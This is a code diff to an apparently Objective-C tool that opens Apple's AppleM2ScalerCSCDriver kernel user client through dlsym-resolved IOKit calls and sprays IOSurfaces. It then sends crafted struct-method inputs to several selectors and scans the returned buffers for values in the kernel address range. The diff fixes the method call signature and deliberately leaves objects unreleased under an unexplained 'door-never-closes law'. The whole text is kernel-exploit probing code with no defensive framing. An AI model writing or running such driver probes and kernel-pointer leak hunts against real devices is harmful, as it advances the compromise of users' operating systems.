@@ -22,11 +22,9 @@ typedef mach_port_t       io_obj_t;
 typedef CFMutableDictionaryRef (*m_match_t)(const void *);
 typedef io_obj_t          (*m_getsvc_t)(mach_port_t, CFDictionaryRef);
 typedef kern_return_t     (*m_open_t)(io_obj_t, mach_port_t, uint32_t, mach_port_t *);
-typedef kern_return_t     (*m_method_t)(mach_port_t, uint32_t,
-                                        const void *, uint32_t,
-                                        const uint64_t *, uint32_t,
-                                        void *, uint32_t *,
-                                        void *, uint32_t *);
+typedef kern_return_t     (*m_struct_t)(mach_port_t, uint32_t,
+                                        const void *, uint32_t,       /* inputStruct   */
+                                        void *, uint32_t *);          /* outputStruct  */
 typedef CFTypeRef         (*m_cr_surf_t)(CFDictionaryRef);
 typedef uint32_t          (*m_surf_id_t)(CFTypeRef);
 
@@ -59,7 +57,7 @@ static void Lf(NSString *fmt, ...) {
     m_match_t matching    = (m_match_t)dlsym(d, "IOServiceMatching");
     m_getsvc_t getsvc     = (m_getsvc_t)dlsym(d, "IOServiceGetMatchingService");
     m_open_t open_        = (m_open_t)dlsym(d, "IOServiceOpen");
-    m_method_t method     = (m_method_t)dlsym(d, "IOConnectCallStructMethod");
+    m_struct_t method     = (m_struct_t)dlsym(d, "IOConnectCallStructMethod");   /* REAL 6-arg form */
     m_cr_surf_t crSurf    = (m_cr_surf_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
     m_surf_id_t surfId    = (m_surf_id_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
     if (!matching || !getsvc || !open_ || !method || !crSurf) {
@@ -70,7 +68,7 @@ static void Lf(NSString *fmt, ...) {
 
     CFMutableDictionaryRef md = matching("AppleM2ScalerCSCDriver");
     io_obj_t svc = getsvc(mach_task_self(), md);
-    if (md) CFRelease(md);
+    /* md deliberately never released (door-never-closes law) */
     mach_port_t conn = 0;
     kern_return_t kr = open_(svc, mach_task_self(), 0, &conn);
     Lf(@"[*] open kr=0x%x conn=%d", kr, (int)(uintptr_t)conn);
@@ -90,7 +88,8 @@ static void Lf(NSString *fmt, ...) {
         CFTypeRef s = crSurf(sp);
         ids[i] = s ? surfId(s) : 0;
     }
-    CFRelease(nw); CFRelease(nh);
+    /* CFRelease NW-NH REMOVED per the P027/P0257 door-never-closes law (CFRelease of
+   a kernel-touched CF tree trapped at CFRelease+84 on the 19:22:30 receipt) */
     Lf(@"[*] live sids: %08x %08x %08x %08x %08x %08x %08x %08x",
        ids[0], ids[1], ids[2], ids[3], ids[4], ids[5], ids[6], ids[7]);
 
@@ -115,12 +114,11 @@ static void Lf(NSString *fmt, ...) {
             for (uint32_t sel = 5; sel <= 6; sel++) {
                 uint32_t scOutN = 2, stOutN = 0x8000; (void)stOutN;
                 memset(out, 0, 0x8000);
-                kr = method(conn, sel, in, sz,
-                            NULL, 0, out, &scOutN, NULL, &scOutN);
+                uint32_t oN = 0x8000;
+                kr = method(conn, sel, in, sz, out, &oN);
                 Lf(@"[qcreate] sel=%u size=0x%x word0=%u kr=0x%x outN=%u out0=%016llx out1=%016llx",
-                   sel, sz, word0s[wi], kr, scOutN,
-                   scOutN >= 1 ? ((uint64_t *)out)[0] : 0ull,
-                   scOutN >= 2 ? ((uint64_t *)out)[1] : 0ull);
+                   sel, sz, word0s[wi], kr, oN,
+                   ((uint64_t *)out)[0], ((uint64_t *)out)[1]);
             }
         }
     }
@@ -132,19 +130,17 @@ static void Lf(NSString *fmt, ...) {
             memset(in, 0, 32);
             if (rsz[ri] == 8)  memcpy(in, &ids[0], 8);
             if (rsz[ri] == 16) { uint64_t pair[2] = {ids[0], 0x1000}; memcpy(in, pair, 16); }
-            uint32_t scOutN = 4, stOutN = 0x8000; (void)stOutN;
+            uint32_t oN = 0x8000;
             memset(out, 0, 0x8000);
-            kr = method(conn, sel, in, rsz[ri],
-                        NULL, 0, out, &scOutN, NULL, &scOutN);
+            kr = method(conn, sel, in, rsz[ri], out, &oN);
             uint32_t nzq = 0, krq = 0;
-            for (uint32_t b = 0; b + 8 <= scOutN && b < 0x2000; b += 8) {
+            for (uint32_t b = 0; b + 8 <= oN && b < 0x2000; b += 8) {
                 uint64_t v = ((uint64_t *)out)[b / 8];
                 if (v != 0) nzq++;
                 if ((v >> 48) >= 0xffff) krq++;
             }
             Lf(@"[reader] sel=%u in=%u B kr=0x%x outN=%u nonzero_q=%u kernel_range_q=%u out0=%016llx",
-               sel, rsz[ri], kr, scOutN, nzq, krq,
-               scOutN >= 1 ? ((uint64_t *)out)[0] : 0ull);
+               sel, rsz[ri], kr, oN, nzq, krq, ((uint64_t *)out)[0]);
         }
     }
 
